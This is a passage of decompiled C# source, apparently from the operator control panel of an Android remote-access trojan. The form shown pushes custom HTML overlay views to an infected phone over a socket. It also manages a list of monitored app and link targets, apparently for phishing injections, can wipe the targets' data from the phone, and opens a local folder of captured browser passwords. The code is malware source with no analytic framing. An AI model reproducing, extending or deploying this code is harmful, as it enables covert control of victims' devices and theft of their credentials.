			OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.InitialDirectory = "C:\\";
			openFileDialog.Title = "Selecte HTML Files (.html)";
			openFileDialog.Filter = "html Files|*.html";
			DialogResult dialogResult = openFileDialog.ShowDialog();
			if (dialogResult == DialogResult.OK)
			{
				string fileName = openFileDialog.FileName;
				DialogResult dialogResult2 = MessageBox.Show("Send This View ?", "Confirm", MessageBoxButtons.YesNo);
				if (dialogResult2 == DialogResult.Yes)
				{
					TcpClient myClient = Classclient.myClient;
					string[] array = Classclient.Keys.Split(':');
					string text = Conversions.ToString(Codes.BSEN(File.ReadAllText(fileName)));
					object[] parametersObjects = new object[4]
					{
						myClient,
						SecurityKey.KeysClient2 + Data.SPL_SOCKET + "ussd<*>" + text + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + Classclient.ClientRemoteAddress,
						Codes.Encoding().GetBytes("null"),
						Classclient
					};
					Classclient.SendMessage(parametersObjects);
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void WebViewMonitor_FormClosing(object sender, FormClosingEventArgs e)
	{
		if (Classclient != null)
		{
			string[] array = Classclient.Keys.Split(':');
			int num = 0;
			int num2 = 0;
			if (Operators.CompareString(DrakeUIComboBox1.Text.ToLower(), "just open".ToLower(), TextCompare: false) == 0)
			{
				statustext.Text = "Request Sent";
			}
			else
			{
				statustext.Text = "Starting Monitoring , Please Wait...";
			}
			object[] parametersObjects = new object[4]
			{
				Classclient.myClient,
				SecurityKey.KeysClient2 + Data.SPL_SOCKET + "bORlQeywIwrkkxg8BnzKHg==STP" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(num) + Data.SPL_SOCKET + Conversions.ToString(num2) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + Classclient.ClientRemoteAddress,
				Codes.Encoding().GetBytes("null"),
				Classclient
			};
			Classclient.SendMessage(parametersObjects);
		}
		BWloader.Dispose();
	}

	private void Timeloader_Tick(object sender, EventArgs e)
	{
	}

	private void Namescombo_SelectedIndexChanged(object sender, EventArgs e)
	{
		try
		{
			if (!string.IsNullOrEmpty(namescombo.Text))
			{
				string text = MapData[namescombo.Text];
				if (text != null && text.Contains(":"))
				{
					string[] array = text.Split(':');
					string text2 = namescombo.Text;
					string text3 = array[0];
					string text4 = array[1];
					nametext.Text = text2;
					linktext.Text = text3;
					idtext.Text = text4;
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void DrakeUIButtonIcon7_Click(object sender, EventArgs e)
	{
		if (!BWloader.IsBusy)
		{
			BWloader.RunWorkerAsync();
		}
	}

	private void DrakeUIButtonIcon5_Click(object sender, EventArgs e)
	{
		datalogtext.Text = "";
	}

	private void DrakeUIButtonIcon8_Click(object sender, EventArgs e)
	{
		if (!string.IsNullOrEmpty(datalogtext.Text))
		{
			Clipboard.SetText(datalogtext.Text);
			CraxsAlert.ShowSucess("Text Copied.");
		}
	}

	private void DrakeUIButtonIcon9_Click(object sender, EventArgs e)
	{
		if (!Directory.Exists(Classclient.FolderUSER + "\\Browser_CAP\\Passwords"))
		{
			CraxsAlert.Showinformation("No Password Founded");
		}
		else
		{
			Process.Start(Classclient.FolderUSER + "\\Browser_CAP\\Passwords");
		}
	}

	private void DrakeUIButtonIcon6_Click(object sender, EventArgs e)
	{
		switch (comandcombo.Text.ToLower())
		{
		case "clean":
			if (string.IsNullOrEmpty(namescombo.Text))
			{
				CraxsAlert.ShowWarning("Select name to remove.");
			}
			else if (Codes.MyMsgBox("Alert", "Are you sure you want to Clean Data For:\r\n" + namescombo.Text + " data will be removed from phone.", useno: true, Resources.information48px))
			{
				string text9 = namescombo.Text;
				string[] array3 = Classclient.Keys.Split(':');
				object[] parametersObjects3 = new object[4]
				{
					Classclient.myClient,
					SecurityKey.KeysClient2 + Data.SPL_SOCKET + "lodp<*>cl<*>" + text9 + Data.SPL_SOCKET + array3[0] + Data.SPL_SOCKET + array3[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + Classclient.ClientRemoteAddress,
					Codes.Encoding().GetBytes("null"),
					Classclient
				};
				Classclient.SendMessage(parametersObjects3);
			}
			break;
		case "edit":
		{
			if (string.IsNullOrEmpty(namescombo.Text))
			{
				CraxsAlert.ShowWarning("Select name to Edit.");
				break;
			}
			string text5 = nametext.Text;
			string text6 = linktext.Text;
			string text7 = "blank";
			if (!string.IsNullOrEmpty(idtext.Text))
			{
				text7 = idtext.Text;
			}
			string text8 = text5 + ">" + text6 + ">" + text7 + ">";
			string[] array2 = Classclient.Keys.Split(':');
			object[] parametersObjects2 = new object[4]
			{
				Classclient.myClient,
				SecurityKey.KeysClient2 + Data.SPL_SOCKET + "lodp<*>ed<*>" + text8 + Data.SPL_SOCKET + array2[0] + Data.SPL_SOCKET + array2[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + Classclient.ClientRemoteAddress,
				Codes.Encoding().GetBytes("null"),
				Classclient
			};
			Classclient.SendMessage(parametersObjects2);
			break;
		}
		case "remove":
			if (string.IsNullOrEmpty(namescombo.Text))
			{
				CraxsAlert.ShowWarning("Select name to remove.");
			}
			else if (Codes.MyMsgBox("Alert", "Are you sure you want to remove\r\n" + namescombo.Text + " from monitoring list ?", useno: true, Resources.information48px))
			{
				string text10 = namescombo.Text;
				string[] array4 = Classclient.Keys.Split(':');
				object[] parametersObjects4 = new object[4]
				{
					Classclient.myClient,
					SecurityKey.KeysClient2 + Data.SPL_SOCKET + "lodp<*>re<*>" + text10 + Data.SPL_SOCKET + array4[0] + Data.SPL_SOCKET + array4[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + Classclient.ClientRemoteAddress,
					Codes.Encoding().GetBytes("null"),
					Classclient
				};
				Classclient.SendMessage(parametersObjects4);
			}
			break;
		case "add":
		{
			if (string.IsNullOrEmpty(nametext.Text) | string.IsNullOrEmpty(linktext.Text))
			{
				CraxsAlert.ShowWarning("Both (Name , Link) is required.");
				break;
			}
			if (comandcombo.Items.Contains(nametext.Text))
			{
				CraxsAlert.ShowWarning("this name already add.");
				break;
			}
			string text = nametext.Text;
			string text2 = linktext.Text;
			string text3 = "blank";
			if (!string.IsNullOrEmpty(idtext.Text))
			{
				text3 = idtext.Text;
			}
			string text4 = text + ">" + text2 + ">" + text3 + ">";
			if (Classclient == null)
			{
				break;
			}
			try
			{
				string[] array = Classclient.Keys.Split(':');
				object[] parametersObjects = new object[4]
				{
					Classclient.myClient,
					SecurityKey.KeysClient2 + Data.SPL_SOCKET + "lodp<*>ad<*>" + text4 + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + Classclient.ClientRemoteAddress,
					Codes.Encoding().GetBytes("null"),
					Classclient
				};
				Classclient.SendMessage(parametersObjects);
				break;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				break;
			}
		}
		}
	}
}
